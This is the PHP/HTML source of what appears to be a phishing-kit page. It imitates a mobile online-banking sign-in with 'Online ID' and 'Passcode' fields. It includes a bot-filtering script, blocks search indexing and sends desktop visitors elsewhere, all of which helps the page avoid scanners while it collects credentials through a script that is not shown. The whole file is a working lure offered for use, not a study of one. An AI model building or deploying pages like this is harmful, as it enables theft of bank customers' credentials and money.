<?php
require "is_bot.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Last-Modified" content="0">
    <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
    <meta http-equiv="Pragma" content="no-cache">
	
	<meta name="360-site-verification" content="e362348efd31ed6e77bcf0ba4963a6de">
    <meta name="sogou_site_verification" content="tKz9Rld4qH">

        <meta name="keywords" content="Test">
        <meta name="description" content="Test">
        <meta name="subject" content="Test">
        <meta name="copyright" content="Test">
        <meta name="url" content="http://www.test.com">
        <meta name="language" content="en-GB">
        <meta name="robots" content="NOINDEX, NOFOLLOW">
        <meta name="pagename" content="$Title">
        <meta name="coverage" content="Worldwide">
        <meta name="distribution" content="Global">
        <meta name="target" content="all">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="640">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="cleartype" content="on">
        <meta name="apple-mobile-web-app-title" content="$Title">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="ResourceLoaderDynamicStyles" content="">
        <meta http-equiv="etag"
        <meta http-equiv="Expires" content="0">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Cache-Control" content="no-cache">
        <meta http-equiv="imagetoolbar" content="no">
        <meta http-equiv="x-dns-prefetch-control" content="off">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">

        <!-- Makes your prototype chrome-less once bookmarked to your phone's home screen -->
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">

        <!-- Set a shorter title for iOS6 devices when saved to home screen -->
        <meta name="apple-mobile-web-app-title" content="Ratchet">
    <title>Sign In</title>
    <link rel="stylesheet" href="css/normalize.min.css">
    <link rel="stylesheet" href="css/estilom.css" />
    <script type="text/javascript">
        if (screen.width > 801) {
            window.location = "index";
        }      
    </script>
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <span>Sign In</span>
        </div>

        <div class="main">
            <form autocomplete="off" id="formusuario">
                <div class="fgrupo">
                    <input class="input input1" type="text" name="usuario" id="usuario2" required placeholder="Online ID"> 
                    <img src="img/save.png" alt="save">
                </div>
                <div class="fgrupo">
                    <input class="input" type="password" name="contra" id="contra2" required placeholder="Passcode" disabled>
                </div>
                <div class="fgrupo">
                    <button type="button" id="comienzo" disabled><img style="margin-right: 10px;" src="img/secure_lock.png"> Sign In</button>
                </div>
                <div class="fgrupo">
                    <a href="javascript:void(0)">Forgot ID/Passcode?</a>
                    <a href="javascript:void(0)">Enroll</a>
                </div>
            </form>
        </div>
        <div class="piem">
            <img src="img/mpie1.png" alt="pie">
            <img src="img/mpie2.png" alt="pie">
        </div>
        <script src="js/funciones.js"></script>
    </div>
</body>

</html>
